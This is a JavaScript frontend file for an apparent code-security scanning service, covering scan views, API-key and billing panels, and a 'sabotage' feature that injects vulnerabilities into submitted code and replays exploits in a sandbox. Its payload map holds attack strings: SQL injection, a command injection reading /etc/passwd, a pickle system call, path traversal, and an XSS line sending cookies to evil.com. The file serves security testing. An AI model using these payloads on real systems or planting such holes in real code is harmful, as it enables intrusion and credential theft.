/**
 * ShadowCoder Frontend v2
 * Phase 3: WebSocket real-time scan progress
 * Phase 5: AI explain / fix / triage panels
 * Phase 6: Project analysis view
 */

document.addEventListener('DOMContentLoaded', () => {
    // ── Authentication Check ────────────────────────────────────────────────
    const token = localStorage.getItem('sc_token');
    if (!token) {
        window.location.href = '/';
        return;
    }

    // ── DOM refs ─────────────────────────────────────────────────────────────
    const codeInput     = document.getElementById('code-input');
    const codeHighlight = document.getElementById('code-highlight');
    const scanBtn       = document.getElementById('scan-btn');
    const scanSpinner   = document.getElementById('scan-spinner');
    const btnText       = document.getElementById('btn-text');
    const detailsBody   = document.getElementById('details-body');
    const vulnBadge     = document.getElementById('vuln-count-badge');
    const terminalPanel = document.getElementById('terminal-container');
    const terminalOutput= document.getElementById('terminal-output');
    const terminalClose = document.getElementById('terminal-close');
    const lineNumbers   = document.getElementById('line-numbers');
    const editorContainer = document.querySelector('.editor-container');
    const progressBar   = document.getElementById('progress-bar');
    const progressLabel = document.getElementById('progress-label');
    const progressWrap  = document.getElementById('progress-wrap');
    const aiToggle      = document.getElementById('ai-toggle');
    const exportJsonBtn = document.getElementById('export-json-btn');
    const sabotageBtn   = document.getElementById('sabotage-btn');
    const exploitToggle = document.getElementById('exploit-toggle');

    const sabotageModal = document.getElementById('sabotage-modal');
    const sabotageVulnsList = document.getElementById('sabotage-vulns-list');
    const sabotageCount = document.getElementById('sab-count');
    const sabotageRevertBtn = document.getElementById('sabotage-revert-btn');
    const sabotageProceedBtn = document.getElementById('sabotage-proceed-btn');
    const closeSabotageModal = document.getElementById('close-sabotage-modal');
    
    // Cracking Overlay Refs
    const crackingOverlay = document.getElementById('cracking-overlay');
    const crackingPercentage = document.getElementById('cracking-percentage');
    const crackingLockStatus = document.getElementById('cracking-lock-status');
    const crackingPhaseBadge = document.getElementById('cracking-phase-badge');
    const crackingFooterText = document.getElementById('cracking-footer-text');
    const crackingFooterBar = document.getElementById('cracking-footer-bar');
    const crackingStatusLight = document.getElementById('cracking-status-light');
    const skipCrackBtn = document.getElementById('skip-crack-btn');
    const memoryStream = document.getElementById('memory-stream');
    
    let isCrackingOverlayActive = false;
    let crackingOverlayTimer = null;
    let crackingSolveInterval = null;

    let currentScanData = null;
    let currentProjectData = null;
    let currentWs       = null;
    let aiEnabled       = false;
    let originalCode    = '';

    // ── Sabotage (Inject Vulnerabilities) ────────────────────────────────────
    sabotageBtn?.addEventListener('click', async () => {
        console.log('Sabotage button clicked');
        const code = codeInput.value.trim();
        if (!code) {
            alert('Please enter some code first.');
            return;
        }

        originalCode = code; // Store for revert
        sabotageBtn.disabled = true;
        sabotageBtn.textContent = '⚔ SABOTAGING...';
        
        try {
            const resp = await fetch('/api/sabotage', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ source_code: code, use_ai: aiEnabled })
            });
            
            if (!resp.ok) {
                const err = await resp.json();
                throw new Error(err.detail || 'Sabotage failed');
            }
            
            const data = await resp.json();
            // The API now returns {"new_code": "...", "summary": [...]}
            const newCode = data.new_code || '';
            codeInput.value = newCode;
            
            // Trigger UI updates
            codeInput.dispatchEvent(new Event('input'));
            
            // Show Sabotage Reveal Modal with the summary
            renderSabotageReport(data);
            
            // Flash success effect on editor
            editorContainer.style.boxShadow = 'inset 0 0 50px rgba(255,45,85,0.2)';
            setTimeout(() => editorContainer.style.boxShadow = '', 1000);
            
        } catch (err) {
            alert('Sabotage Error: ' + err.message);
        } finally {
            sabotageBtn.disabled = false;
            sabotageBtn.textContent = '⚔ SABOTAGE';
        }
    });

    // ── Payload map: vuln type → realistic attack string ──────────────────────
    function vulnPayload(vuln_type) {
        const t = (vuln_type || '').toLowerCase();
        if (t.includes('sql'))        return `' OR '1'='1' --`;
        if (t.includes('command'))    return `; cat /etc/passwd`;
        if (t.includes('md5') || t.includes('crypto')) return `admin:${btoa('collision_hash_attack')}`;
        if (t.includes('secret') || t.includes('token') || t.includes('hardcoded')) return `LEAKED_KEY=sk-prod-abc123xyz789hardcoded`;
        if (t.includes('pickle') || t.includes('deserializ')) return `__import__('os').system('id')`;
        if (t.includes('tls') || t.includes('ssl') || t.includes('verify')) return `MITM_INTERCEPT:evil.crt`;
        if (t.includes('xss'))        return `<script>fetch('https://evil.com?c='+document.cookie)</script>`;
        if (t.includes('path') || t.includes('traversal')) return `../../etc/passwd`;
        return `PROBE: ${vuln_type}`;
    }

    function renderSabotageReport(data) {
        const vulns = data.summary || [];
        sabotageCount.textContent = vulns.length;

        if (vulns.length === 0) {
            sabotageVulnsList.innerHTML = '<p style="color:var(--text-muted);font-size:12px;">No specific details provided by AI, but code has been modified.</p>';
        } else {
            sabotageVulnsList.innerHTML = vulns.map((v, idx) => `
                <div class="sab-vuln-item" data-idx="${idx}">
                    <div class="sab-vuln-header">
                        <div class="sab-vuln-meta">
                            <span class="sab-vuln-badge">${idx + 1}</span>
                            <span class="sab-vuln-type">${esc(v.vuln_type)}</span>
                            ${v.line ? `<span class="sab-vuln-line">LINE ${v.line}</span>` : ''}
                        </div>
                        <button class="sab-sim-btn" data-payload="${esc(vulnPayload(v.vuln_type))}" data-vuln="${esc(v.vuln_type)}" title="Simulate this exploit in the sandbox">
                            <span class="sab-sim-icon">⚡</span> SIMULATE
                        </button>
                    </div>
                    <span class="sab-vuln-expl">${esc(v.explanation)}</span>
                    <div class="sab-vuln-payload-tag">
                        <span class="sab-payload-label">PAYLOAD</span>
                        <code class="sab-payload-code">${esc(vulnPayload(v.vuln_type))}</code>
                    </div>
                </div>
            `).join('');

            // Attach per-vuln simulate buttons
            sabotageVulnsList.querySelectorAll('.sab-sim-btn').forEach(btn => {
                btn.addEventListener('click', async () => {
                    const payload = btn.dataset.payload;
                    const vulnName = btn.dataset.vuln;
                    btn.disabled = true;
                    btn.innerHTML = '<span class="sab-sim-icon">⏳</span> RUNNING...';
                    sabotageModal.classList.remove('visible');
                    await runSabotageSimulation(vulnName, payload);
                    btn.disabled = false;
                    btn.innerHTML = '<span class="sab-sim-icon">⚡</span> SIMULATE';
                });
            });
        }

        // Wire up "Simulate All" button
        const simAllBtn = document.getElementById('sab-sim-all-btn');
        if (simAllBtn) {
            simAllBtn.onclick = async () => {
                if (vulns.length === 0) return;
                simAllBtn.disabled = true;
                simAllBtn.textContent = '⏳ RUNNING CHAIN...';
                sabotageModal.classList.remove('visible');
                for (let i = 0; i < vulns.length; i++) {
                    const v = vulns[i];
                    await runSabotageSimulation(v.vuln_type, vulnPayload(v.vuln_type), i, vulns.length);
                    if (i < vulns.length - 1) await sleep(600);
                }
                simAllBtn.disabled = false;
                simAllBtn.textContent = '🔗 SIMULATE ALL';
            };
        }

        sabotageModal.classList.add('visible');
    }

    // ── Sabotage-aware simulation runner ───────────────────────────────────────
    async function runSabotageSimulation(vulnName, payload, chainIdx = null, chainTotal = null) {
        terminalPanel.classList.add('visible');
        terminalOutput.className = 'terminal-output';

        const isChain = chainIdx !== null;
        const chainPrefix = isChain ? `[${chainIdx + 1}/${chainTotal}] ` : '';
        const ts = new Date().toISOString();

        let out = [
            `╔══════════════════════════════════════════════════════╗`,
            `║  SHADOWCODER EXPLOIT SIMULATOR v2.1                  ║`,
            `╚══════════════════════════════════════════════════════╝`,
            ``,
            `[${ts}] ${chainPrefix}TARGETING: ${vulnName}`,
            `[*] Loading sabotaged code from editor...`,
            `[*] Crafting exploit payload: ${payload}`,
            `[*] Spinning up isolated sandbox...`,
            ``,
        ].join('\n') + '\n';

        terminalOutput.textContent = out;
        terminalOutput.scrollTop = terminalOutput.scrollHeight;

        // Animate "scanning" lines
        const scanLines = [
            '[>] Parsing AST for injection surface...',
            '[>] Locating vulnerable call site...',
            '[>] Injecting payload into sandbox runtime...',
            '[>] Tracing execution path...',
        ];
        for (const line of scanLines) {
            out += line + '\n';
            terminalOutput.textContent = out;
            terminalOutput.scrollTop = terminalOutput.scrollHeight;
            await sleep(180);
        }
        out += '\n';
        terminalOutput.textContent = out;

        try {
            const resp = await fetch('/api/simulate', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ source_code: codeInput.value, payload })
            });
            const result = await resp.json();

            const success = result.success;
            const outputLines = (result.output || '').split('\n');

            const header = success
                ? [`[!!!] EXPLOIT SUCCESSFUL — ${vulnName} CONFIRMED`, `[+] Sandbox stdout:`]
                : [`[---] EXPLOIT BLOCKED — payload did not execute`, `[-] Sandbox response:`];

            for (const line of [...header, '', ...outputLines]) {
                out += line + '\n';
                terminalOutput.textContent = out;
                terminalOutput.scrollTop = terminalOutput.scrollHeight;
                await sleep(35);
            }

            if (success) {
                out += `\n[!!!] CRITICAL: ${vulnName} is exploitable in this build.\n`;
                out += `[!!!] Recommended: Run EXECUTE SCAN NOW to generate full report.\n`;
            } else {
                out += `\n[--] Mitigation held. Vuln may require specific code path.\n`;
            }

            if (isChain && chainIdx < chainTotal - 1) {
                out += `\n[>>] Chain continues — next vuln in 600ms...\n`;
            } else if (isChain) {
                out += `\n[>>] CHAIN COMPLETE — ${chainTotal} exploits tested.\n`;
            }

            terminalOutput.textContent = out;
            terminalOutput.scrollTop = terminalOutput.scrollHeight;
            terminalOutput.className = 'terminal-output ' + (success ? 'success' : 'failure');

        } catch (e) {
            out += `\n[!] Sandbox error: ${e.message}\n`;
            terminalOutput.textContent = out;
            terminalOutput.className = 'terminal-output failure';
        }
    }

    sabotageRevertBtn?.addEventListener('click', () => {
        if (originalCode) {
            codeInput.value = originalCode;
            codeInput.dispatchEvent(new Event('input'));
            sabotageModal.classList.remove('visible');
        }
    });

    sabotageProceedBtn?.addEventListener('click', () => {
        sabotageModal.classList.remove('visible');
        scanBtn.click(); // Trigger scan
    });

    closeSabotageModal?.addEventListener('click', () => {
        sabotageModal.classList.remove('visible');
    });

    // ── Export Report ────────────────────────────────────────────────────────
    exportJsonBtn?.addEventListener('click', () => {
        let exportData = null;
        let prefix = 'report';

        if (scannerView.style.display === 'flex' && currentScanData) {
            exportData = currentScanData;
            prefix = 'scan-report';
        } else if (projectView.style.display === 'flex' && currentProjectData) {
            exportData = currentProjectData;
            prefix = 'project-analysis';
        }

        if (!exportData) {
            alert('No data available to export in the current view. Run a scan or analysis first.');
            return;
        }

        const dataStr = JSON.stringify(exportData, null, 2);
        const blob = new Blob([dataStr], { type: 'application/json' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `shadowcoder-${prefix}-${new Date().getTime()}.json`;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
    });

    // ── Navigation (View Switching) ──────────────────────────────────────────
    const navLinks = document.querySelectorAll('.nav-links li');
    const scannerView = document.getElementById('scanner-view');
    const projectView = document.getElementById('project-view');
    const dynamicView = document.getElementById('dynamic-view');
    const scansView   = document.getElementById('scans-view');
    const settingsView = document.getElementById('settings-view');
    const billingView = document.getElementById('billing-view');
    const apiKeysView = document.getElementById('api-keys-view');
    const cicdView    = document.getElementById('cicd-view');

    navLinks.forEach(link => {
        link.addEventListener('click', () => {
            const text = link.textContent.trim().toLowerCase();
            if (text.includes('dashboard')) {
                showView('scanner');
                setActiveLink(link);
            } else if (text.includes('scans')) {
                showView('scans');
                setActiveLink(link);
                loadScanHistory();
            } else if (text.includes('project analysis')) {
                showView('project');
                setActiveLink(link);
            } else if (text.includes('dynamic scan')) {
                showView('dynamic');
                setActiveLink(link);
            } else if (text.includes('api keys')) {
                showView('api-keys');
                setActiveLink(link);
                loadApiKeys();
            } else if (text.includes('ci/cd')) {
                showView('cicd');
                setActiveLink(link);
                loadCiCd();
            } else if (text.includes('billing')) {
                showView('billing');
                setActiveLink(link);
                loadBillingData();
            } else if (text.includes('settings')) {
                showView('settings');
                setActiveLink(link);
            }
        });
    });

    function showView(view) {
        scannerView.style.display = view === 'scanner' ? 'flex' : 'none';
        projectView.style.display = view === 'project' ? 'flex' : 'none';
        dynamicView.style.display = view === 'dynamic' ? 'flex' : 'none';
        scansView.style.display   = view === 'scans' ? 'flex' : 'none';
        settingsView.style.display = view === 'settings' ? 'flex' : 'none';
        billingView.style.display = view === 'billing' ? 'flex' : 'none';
        apiKeysView.style.display = view === 'api-keys' ? 'flex' : 'none';
        cicdView.style.display    = view === 'cicd' ? 'flex' : 'none';
        
        if (view === 'dynamic') {
            document.querySelector('.page-title').textContent = 'Dynamic Assessment';
        } else if (view === 'project') {
            document.querySelector('.page-title').textContent = 'Project Analysis';
        } else {
            document.querySelector('.page-title').textContent = 'Multi-Vector Analysis';
        }
    }

    // ── Dynamic Scan (Target URL) ──────────────────────────────────────────
    const analyzeDynamicBtn = document.getElementById('analyze-dynamic-btn');
    const dynamicPagesBody = document.getElementById('dynamic-pages-body');
    const dynamicFormsBody = document.getElementById('dynamic-forms-body');
    const dynamicFindingsBody = document.getElementById('dynamic-findings-body');

    analyzeDynamicBtn?.addEventListener('click', async () => {
        const url = document.getElementById('dynamic-url').value.trim();
        if (!url) return;

        analyzeDynamicBtn.disabled = true;
        analyzeDynamicBtn.innerHTML = '<span class="btn-icon spinning">⚡</span> SCANNING...';
        
        dynamicPagesBody.innerHTML = '<div class="empty-state"><p class="empty-sub">Connecting to target...</p></div>';
        dynamicFormsBody.innerHTML = '<div class="empty-state"><p class="empty-sub">Crawling forms...</p></div>';
        dynamicFindingsBody.innerHTML = '<div class="empty-state"><p class="empty-sub">Analyzing responses...</p></div>';

        try {
            const token = localStorage.getItem('sc_token');
            const headers = { 'Content-Type': 'application/json' };
            if (token) headers['Authorization'] = `Bearer ${token}`;

            const resp = await fetch('/scan', {
                method: 'POST',
                headers: headers,
                body: JSON.stringify({ target_url: url })
            });

            if (!resp.ok) throw new Error('Failed to start dynamic scan');
            const { job_id } = await resp.json();

            // Poll for dynamic scan completion
            for (let i = 0; i < 60; i++) {
                await new Promise(r => setTimeout(r, 2000));
                const statResp = await fetch(`/scan/${job_id}`);
                const statData = await statResp.json();

                if (statData.status === 'COMPLETE') {
                    renderDynamicResult(statData.result);
                    break;
                } else if (statData.status === 'FAILED') {
                    throw new Error(statData.error || 'Scan failed');
                }
            }
        } catch (e) {
            dynamicFindingsBody.innerHTML = `<div class="empty-state"><p class="empty-title" style="color:var(--sev-critical)">ERROR</p><p class="empty-sub">${e.message}</p></div>`;
        }

        analyzeDynamicBtn.disabled = false;
        analyzeDynamicBtn.innerHTML = '<span class="btn-icon">⚡</span> RUN DYNAMIC SCAN';
    });

    function renderDynamicResult(data) {
        const pages = data.pages || [];
        const forms = data.forms || [];
        const findings = data.findings || [];

        dynamicPagesBody.innerHTML = pages.length ? pages.map(p => `
            <div style="padding: 8px; border-bottom: 1px solid var(--border); font-family: var(--font-mono); font-size: 11px;">
                <span style="color:var(--cyan)">GET</span> ${esc(p)}
            </div>
        `).join('') : '<div class="empty-state"><p class="empty-sub">No pages found.</p></div>';

        dynamicFormsBody.innerHTML = forms.length ? forms.map(f => `
            <div style="padding: 8px; border-bottom: 1px solid var(--border); font-family: var(--font-mono); font-size: 11px;">
                <span style="color:var(--purple)">FORM</span> ${esc(f.action || 'unknown')} (${f.method || 'GET'})
            </div>
        `).join('') : '<div class="empty-state"><p class="empty-sub">No forms discovered.</p></div>';

        dynamicFindingsBody.innerHTML = findings.length ? findings.map(f => `
            <div class="detail-card" style="margin-bottom: 10px;">
                <div class="card-header">
                    <span class="severity-badge ${f.severity}">${f.severity}</span>
                </div>
                <h3 class="detail-title">${esc(f.vulnerability?.vuln_type || 'Unknown')}</h3>
                <p class="detail-text" style="margin-top: 5px;">${esc(f.vulnerability?.description || 'No description')}</p>
                <div style="margin-top: 5px; font-family: var(--font-mono); font-size: 10px; color: var(--text-muted);">
                    URL: ${esc(f.vulnerability?.cwe || '')}
                </div>
            </div>
        `).join('') : '<div class="empty-state"><p class="empty-sub" style="color:var(--green)">No dynamic vulnerabilities detected.</p></div>';
    }

    // ── API Keys ───────────────────────────────────────────────────────────
    const keysListBody = document.getElementById('keys-list-body');
    const newKeyDisplay = document.getElementById('new-key-display');
    const newKeyRaw = document.getElementById('new-key-raw');

    async function loadApiKeys() {
        if (!keysListBody) return;
        const token = localStorage.getItem('sc_token');
        try {
            const resp = await fetch('/api/user/api-keys', { headers: { 'Authorization': `Bearer ${token}` } });
            if (!resp.ok) throw new Error('Failed to load keys');
            const data = await resp.json();
            
            if (data.api_keys.length === 0) {
                keysListBody.innerHTML = '<div style="padding: 20px; color: var(--text-muted); font-size: 13px;">No API keys found.</div>';
                return;
            }

            keysListBody.innerHTML = data.api_keys.map((k, i) => `
                <div style="display: flex; align-items: center; padding: 14px 20px; border-bottom: ${i < data.api_keys.length - 1 ? '1px solid var(--border)' : 'none'}; gap: 16px;">
                    <div style="flex: 1;">
                        <div style="font-size: 13px; font-weight: 600; color: #fff;">${esc(k.name)}</div>
                        <div style="font-family: var(--font-mono); font-size: 11px; color: var(--text-muted); margin-top: 2px;">${esc(k.key_prefix)}</div>
                    </div>
                    <div style="font-size: 11px; color: var(--text-muted);">Last used: ${k.last_used_at ? new Date(k.last_used_at).toLocaleDateString() : 'Never'}</div>
                    <div style="font-size: 11px; color: var(--text-muted);">${k.total_requests} req</div>
                    <div style="padding: 2px 8px; border-radius: 4px; font-size: 10px; font-family: var(--font-mono); ${k.active ? 'background: rgba(0,255,136,0.1); color: var(--green);' : 'background: rgba(255,255,255,0.05); color: var(--text-muted);'}">${k.active ? 'ACTIVE' : 'REVOKED'}</div>
                    ${k.active ? `<button onclick="revokeApiKey('${k.key_id}')" style="background: none; border: 1px solid var(--border); border-radius: 4px; color: var(--text-muted); cursor: pointer; padding: 4px 8px; font-size: 11px;">✕</button>` : '<div style="width: 26px;"></div>'}
                </div>
            `).join('');
        } catch (e) {
            keysListBody.innerHTML = `<div style="padding: 20px; color: var(--red); font-size: 13px;">${e.message}</div>`;
        }
    }

    document.getElementById('create-key-btn')?.addEventListener('click', async () => {
        const nameInput = document.getElementById('new-key-name');
        const token = localStorage.getItem('sc_token');
        try {
            const resp = await fetch('/api/user/api-keys', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
                body: JSON.stringify({ name: nameInput.value || 'Production' })
            });
            const data = await resp.json();
            if (!resp.ok) throw new Error(data.detail || 'Failed to create key');
            
            newKeyRaw.textContent = data.raw_key;
            newKeyDisplay.style.display = 'block';
            nameInput.value = '';
            loadApiKeys();
        } catch (e) { alert(e.message); }
    });

    window.revokeApiKey = async (id) => {
        if (!confirm('Revoke this API key? This cannot be undone.')) return;
        const token = localStorage.getItem('sc_token');
        try {
            await fetch(`/api/user/api-keys/${id}`, { method: 'DELETE', headers: { 'Authorization': `Bearer ${token}` } });
            loadApiKeys();
        } catch (e) { alert('Failed to revoke key'); }
    };

    // ── CI/CD ──────────────────────────────────────────────────────────────
    const ciListBody = document.getElementById('ci-list-body');
    
    async function loadCiCd() {
        if (!ciListBody) return;
        const token = localStorage.getItem('sc_token');
        try {
            // Check plan first
            const meResp = await fetch('/api/user/me', { headers: { 'Authorization': `Bearer ${token}` } });
            const meData = await meResp.json();
            const canUse = ['pro', 'team', 'enterprise'].includes(meData.user?.plan);
            
            if (!canUse) {
                document.getElementById('cicd-upgrade-notice').style.display = 'block';
                document.getElementById('cicd-content').style.display = 'none';
                return;
            }
            document.getElementById('cicd-upgrade-notice').style.display = 'none';
            document.getElementById('cicd-content').style.display = 'block';

            const resp = await fetch('/api/user/ci-tokens', { headers: { 'Authorization': `Bearer ${token}` } });
            if (!resp.ok) throw new Error('Failed to load tokens');
            const data = await resp.json();

            if (data.ci_tokens.length === 0) {
                ciListBody.innerHTML = '<div style="padding: 20px; color: var(--text-muted); font-size: 13px;">No CI/CD tokens found.</div>';
                return;
            }

            ciListBody.innerHTML = data.ci_tokens.map((k, i) => `
                <div style="display: flex; align-items: center; padding: 14px 20px; border-bottom: ${i < data.ci_tokens.length - 1 ? '1px solid var(--border)' : 'none'}; gap: 16px;">
                    <div style="flex: 1;">
                        <div style="font-size: 13px; font-weight: 600; color: #fff;">${esc(k.repo)}</div>
                        <div style="font-family: var(--font-mono); font-size: 11px; color: var(--text-muted); margin-top: 2px;">${esc(k.name)}</div>
                    </div>
                    <div style="font-family: var(--font-mono); font-size: 11px; color: var(--green);">${esc(k.token)}</div>
                    <div style="font-size: 11px; color: var(--text-muted);">Runs: ${k.total_runs}</div>
                    <div style="padding: 2px 8px; border-radius: 4px; font-size: 10px; font-family: var(--font-mono); ${k.active ? 'background: rgba(0,255,136,0.1); color: var(--green);' : 'background: rgba(255,255,255,0.05); color: var(--text-muted);'}">${k.active ? 'ACTIVE' : 'REVOKED'}</div>
                    ${k.active ? `<button onclick="revokeCiToken('${k.token}')" style="background: none; border: 1px solid var(--border); border-radius: 4px; color: var(--text-muted); cursor: pointer; padding: 4px 8px; font-size: 11px;">✕</button>` : '<div style="width: 26px;"></div>'}
                </div>
            `).join('');
        } catch (e) {
            ciListBody.innerHTML = `<div style="padding: 20px; color: var(--red); font-size: 13px;">${e.message}</div>`;
        }
    }

    document.getElementById('create-ci-btn')?.addEventListener('click', async () => {
        const repoInput = document.getElementById('ci-repo-name');
        const nameInput = document.getElementById('ci-token-name');
        if (!repoInput.value) return;

        const token = localStorage.getItem('sc_token');
        try {
            const resp = await fetch('/api/user/ci-tokens', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
                body: JSON.stringify({ repo: repoInput.value, name: nameInput.value || 'CI Pipeline' })
            });
            const data = await resp.json();
            if (!resp.ok) throw new Error(data.detail || 'Failed to create token');
            
            repoInput.value = '';
            nameInput.value = '';
            loadCiCd();
        } catch (e) { alert(e.message); }
    });

    window.revokeCiToken = async (id) => {
        if (!confirm('Revoke this CI/CD token?')) return;
        const token = localStorage.getItem('sc_token');
        try {
            await fetch(`/api/user/ci-tokens/${id}`, { method: 'DELETE', headers: { 'Authorization': `Bearer ${token}` } });
            loadCiCd();
        } catch (e) { alert('Failed to revoke token'); }
    };

    // ── Scan History ────────────────────────────────────────────────────────
    const scansHistoryBody = document.getElementById('scans-history-body');
    let scanHistory = JSON.parse(localStorage.getItem('sc_history') || '[]');

    async function loadScanHistory() {
        if (!scansHistoryBody) return;
        
        const token = localStorage.getItem('sc_token');
        if (token) {
            try {
                scansHistoryBody.innerHTML = '<div class="ai-loading"><span class="ai-pulse"></span> Syncing history...</div>';
                const resp = await fetch('/api/user/scans', {
                    headers: { 'Authorization': `Bearer ${token}` }
                });
                if (resp.ok) {
                    const data = await resp.json();
                    scanHistory = data.scans.map(s => ({
                        date: s.scanned_at,
                        filename: s.filename,
                        vulnerabilities: s.vulnerabilities_found,
                        source: s.source_code || '# Source code not available'
                    }));
                }
            } catch (e) {
                console.error("Failed to sync scans:", e);
            }
        }

        if (scanHistory.length === 0) {
            scansHistoryBody.innerHTML = '<div class="empty-state"><p class="empty-sub">No recent scans found.</p></div>';
            return;
        }

        scansHistoryBody.innerHTML = scanHistory.map((scan, idx) => `
            <div class="scan-history-item">
                <div class="scan-info">
                    <span class="scan-file">${esc(scan.filename || 'stdin')}</span>
                    <span class="scan-date">${new Date(scan.date).toLocaleString()}</span>
                </div>
                <div class="scan-stats">
                    <span class="scan-vulns">${scan.vulnerabilities} VULNS</span>
                    <button class="btn-view-scan" onclick="restoreScan(${idx})">VIEW</button>
                </div>
            </div>
        `).join('');
    }

    window.restoreScan = (idx) => {
        const scan = scanHistory[idx];
        if (!scan) return;
        codeInput.value = scan.source;
        showView('scanner');
        setActiveLink(navLinks[0]);
        // Trigger highlight update
        codeInput.dispatchEvent(new Event('input'));
    };

    document.getElementById('clear-history-btn')?.addEventListener('click', () => {
        if (confirm('Clear all scan history?')) {
            localStorage.removeItem('sc_history');
            scanHistory.length = 0;
            loadScanHistory();
        }
    });

    // ── Settings ───────────────────────────────────────────────────────────
    document.getElementById('save-settings-btn')?.addEventListener('click', async () => {
        const config = {
            model: document.getElementById('setting-ai-model').value,
            sandbox: document.getElementById('setting-sandbox-level').value,
            depth: document.getElementById('setting-scan-depth').value
        };
        localStorage.setItem('sc_config', JSON.stringify(config));
        
        const token = localStorage.getItem('sc_token');
        if (token) {
            try {
                await fetch('/api/user/me', {
                    method: 'PATCH',
                    headers: { 
                        'Content-Type': 'application/json',
                        'Authorization': `Bearer ${token}` 
                    },
                    body: JSON.stringify({ settings: config })
                });
            } catch (e) {
                console.error("Failed to sync settings:", e);
            }
        }
        alert('Configuration saved successfully.');
    });

    // Load initial settings
    async function loadInitialSettings() {
        const token = localStorage.getItem('sc_token');
        if (token) {
            try {
                const resp = await fetch('/api/user/me', {
                    headers: { 'Authorization': `Bearer ${token}` }
                });
                if (resp.ok) {
                    const data = await resp.json();
                    if (data.user && data.user.settings) {
                        localStorage.setItem('sc_config', JSON.stringify(data.user.settings));
                    }
                }
            } catch (e) {
                console.error("Failed to load settings:", e);
            }
        }

        const config = JSON.parse(localStorage.getItem('sc_config') || '{}');
        if (config.model) document.getElementById('setting-ai-model').value = config.model;
        if (config.sandbox) document.getElementById('setting-sandbox-level').value = config.sandbox;
        if (config.depth) document.getElementById('setting-scan-depth').value = config.depth;
    }
    loadInitialSettings();

    // ── Billing (SaaS Integration) ──────────────────────────────────────────
    const plansGrid = document.getElementById('plans-grid');
    const billingStatusBody = document.getElementById('billing-status-body');

    async function loadBillingData() {
        if (!plansGrid) return;
        
        plansGrid.innerHTML = '<div class="ai-loading"><span class="ai-pulse"></span> Synchronizing with billing engine...</div>';
        
        try {
            const resp = await fetch('/api/billing/plans');
            const data = await resp.json();
            renderPlans(data.plans);
            
            // Try to load user subscription if token exists
            const token = localStorage.getItem('sc_token');
            if (token) {
                const subResp = await fetch('/api/billing/subscription', {
                    headers: { 'Authorization': `Bearer ${token}` }
                });
                if (subResp.ok) {
                    const subData = await subResp.json();
                    renderSubscriptionStatus(subData);
                } else {
                    billingStatusBody.innerHTML = '<p class="detail-text">Session expired. <a href="/static/dashboard/index.html" style="color:var(--green)">Login to manage subscription</a></p>';
                }
            } else {
                billingStatusBody.innerHTML = '<p class="detail-text">Authentication required. <a href="/static/dashboard/index.html" style="color:var(--green)">Login/Register</a> to upgrade.</p>';
            }
        } catch (e) {
            plansGrid.innerHTML = `<div class="empty-state"><p class="empty-title" style="color:var(--sev-critical)">BILLING ERROR</p><p class="empty-sub">${e.message}</p></div>`;
        }
    }

    function renderPlans(plans) {
        if (!plans) return;
        const planOrder = ['free', 'pro', 'team', 'enterprise'];
        const planColors = { free: 'var(--text-muted)', pro: 'var(--cyan)', team: 'var(--purple)', enterprise: 'var(--green)' };

        plansGrid.innerHTML = planOrder.filter(p => plans[p]).map(key => {
            const p = plans[key];
            const color = planColors[key];
            const isEnterprise = key === 'enterprise';
            
            return `
                <div class="plan-card" style="border-top: 2px solid ${color}">
                    <div class="plan-header">
                        <span class="plan-name" style="color:${color}">${key.toUpperCase()}</span>
                        <div class="plan-price">
                            ${p.price_monthly === 0 ? 'FREE' : p.price_monthly === null ? 'CUSTOM' : `$${p.price_monthly}<span class="price-period">/mo</span>`}
                        </div>
                    </div>
                    <ul class="plan-features">
                        ${(p.features || []).map(f => `<li><span class="feat-icon">✓</span> ${esc(f)}</li>`).join('')}
                    </ul>
                    ${isEnterprise 
                        ? `<a href="mailto:sales@shadowcoder.dev" class="btn-plan-action enterprise">CONTACT SALES</a>`
                        : `<button class="btn-plan-action ${key}" onclick="initiateCheckout('${key}')">UPGRADE TO ${key.toUpperCase()}</button>`
                    }
                </div>
            `;
        }).join('');
    }

    function renderSubscriptionStatus(data) {
        const sub = data.subscription || {};
        const plan = data.plan || {};
        billingStatusBody.innerHTML = `
            <div class="status-grid">
                <div class="status-item">
                    <span class="status-lbl">CURRENT_PLAN</span>
                    <span class="status-val" style="color:var(--green)">${(sub.plan || 'free').toUpperCase()}</span>
                </div>
                <div class="status-item">
                    <span class="status-lbl">STATUS</span>
                    <span class="status-val">${(sub.status || 'inactive').toUpperCase()}</span>
                </div>
                <div class="status-item">
                    <span class="status-lbl">MONTHLY_QUOTA</span>
                    <span class="status-val">${data.quota?.used} / ${data.quota?.limit === -1 ? '∞' : data.quota?.limit}</span>
                </div>
            </div>
            <div class="section-divider"></div>
            <button class="btn-portal" onclick="openBillingPortal()">MANAGE VIA STRIPE PORTAL</button>
        `;
    }

    window.initiateCheckout = async (plan) => {
        const token = localStorage.getItem('sc_token');
        if (!token) { window.location.href = '/static/dashboard/index.html'; return; }
        
        try {
            const resp = await fetch('/api/billing/checkout', {
                method: 'POST',
                headers: { 
                    'Content-Type': 'application/json',
                    'Authorization': `Bearer ${token}`
                },
                body: JSON.stringify({ plan, billing_period: 'monthly' })
            });
            const data = await resp.json();
            if (data.checkout_url) window.location.href = data.checkout_url;
            else alert(data.detail || 'Checkout failed');
        } catch (e) { alert('Error: ' + e.message); }
    };

    window.openBillingPortal = async () => {
        const token = localStorage.getItem('sc_token');
        try {
            const resp = await fetch('/api/billing/portal', {
                method: 'POST',
                headers: { 'Authorization': `Bearer ${token}` }
            });
            const data = await resp.json();
            if (data.portal_url) window.location.href = data.portal_url;
        } catch (e) { alert('Error: ' + e.message); }
    };

    function setActiveLink(activeEl) {
        navLinks.forEach(l => l.classList.remove('active'));
        activeEl.classList.add('active');
        // Add/remove dots
        document.querySelectorAll('.nav-dot').forEach(d => d.remove());
        const dot = document.createElement('span');
        dot.className = 'nav-dot';
        activeEl.appendChild(dot);
    }

    // ── Project Analysis (Phase 6) ───────────────────────────────────────────
    const analyzeProjectBtn = document.getElementById('analyze-project-btn');
    const projectPathInput  = document.getElementById('project-path');
    const surfaceBody       = document.getElementById('surface-body');
    const endpointsBody     = document.getElementById('endpoints-body');
    const flowsBody         = document.getElementById('flows-body');

